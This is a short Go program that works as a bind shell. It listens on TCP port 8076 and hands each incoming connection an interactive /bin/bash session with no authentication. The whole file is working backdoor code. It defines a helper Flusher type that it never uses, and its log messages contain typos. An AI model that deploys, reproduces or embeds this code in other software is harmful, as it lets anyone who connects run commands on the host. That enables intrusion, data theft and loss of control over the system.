package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}

	if err := foo.w.Flush(); err != nil {
		return -1, err
	}

	return count, err
}

func handler(conn net.Conn) {
	cmd := exec.Command("/bin/bash", "-i")

	rp, wp := io.Pipe()

	cmd.Stdin = conn
	cmd.Stdout = wp

	go io.Copy(conn, rp)

	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}

	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":8076")
	if err != nil {
		log.Fatalln("Unable to bind port")
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("unable to accpet connection")
		}
		log.Println("Connection accpeted")

		go handler(conn)
	}
}
